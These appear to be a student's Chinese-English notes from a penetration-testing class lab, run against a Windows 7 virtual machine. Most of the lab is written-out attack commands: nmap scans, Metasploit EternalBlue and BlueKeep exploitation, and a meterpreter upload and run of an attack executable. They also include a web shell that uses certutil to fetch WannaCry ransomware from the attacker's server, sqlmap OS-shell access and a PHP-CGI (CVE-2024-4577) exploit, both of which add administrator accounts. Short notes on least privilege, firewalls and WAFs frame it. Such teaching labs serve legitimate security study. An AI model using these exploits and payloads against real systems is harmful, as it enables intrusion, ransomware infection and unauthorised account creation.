# 加密
- speacher: pro. Hung
- date: 2025-8-6
- class 4

#SQLinjection #CVE #remote #kali #

what port
22 - SSH
3389 - RDP 遠端

原則阻擋例外開放。
最小權限原則。

若無法更新，將裝置遠離網路減少風險。
若必要使用網路，要限制網路來源
虛擬機快照 會包含記憶體空間(虛擬4G)
VMware: vmdk
Virtual: 

開機快照會包含記憶體，但可能會影響服務或中斷服務

快照
練習服務

## lab
免責聲明，僅用於此教學0806 虛擬機
boot kali and Win7
檢查環境
kali:
```c
$ ifconfig
eth0: 192.168.50.100
$ nmap 192.168.50.0/24
$ nmap 192.168.50.50 -p1-65535 -O -T4 -sV
$ msfconsole
msf6> search 17-010
msf6> use exploit 
msf6 exploit(w7)> set rhosts 192.168.50.50
msf6 exploit(w7)> set lhost 192.168.50.100
msf6 exploit(w7)> show options
msf6 exploit(w7)> exploit
meterpreter > upload /home/kali/Desktop/Attack.exe C:\\system.exe
meterpreter > execute -f C:\\system.exe
meterpreter > sreenshot

成功
案例二
search 0708
use exploit/0708bluekeep
set rhosts 192.168.50.50
set lhost 192.168.50.100
set target 2


note nmap option
-p/port 1,3,4 or 1-65530
-O check OS version
-T4 time limit 4 seccons
-sV show software version


透過網路芳鄰攻擊
139、445 win7 嚴重漏洞
google 查詢 `windows 7 445 port cve`
常常導致windows 7 當機
還原win7快照
0-click attack
show target

google 查詢 `windows 7 3389 port cve`
cve 2019-0708 bluekeep
```

### 1.1 example 3
僅使用於此0806教學
web shell
upload the file `web-shell`
取代upload.php
目錄攻擊
```c
linux架起簡易網站
python3 -m http.server --bind 192.168.50.100 
讓其他人可以藉由服務漏洞抓取惡意程式
> certutil -urlcache -split -f "http://192.168.50.100:8000/Desktop/Ransomware/WannaCry.EXE" "C:\sysweb.exe"
藉由webshell抓取惡意程式
C:\sysweb.exe
執行
```
### 1.2 example 4
sql injection
透過語言漏洞執行遠端shell
```console
python3 -m http.server 192.168.50.100 
$ sqlmap -u 'http://192.168.50.50/sqli/' --forms --os-shell --batch
透過sql網頁進入OS-shell
os-shell> net user abministartr 123456 /add
在遠端新增帳戶
os-shell> net user 查看
```
### 1.2 example 5
PHP CGI 漏洞 
CVE-2024-4577
在Windows上的PHP版本漏洞
python exploit.py -u http://192.168.50.50:18081
shell> net user adninistrator 123456 /add
可以任意執行


### 防護
WAF 網頁防火牆，第七層偵測活動
firewall 防火牆，第四層管理服務
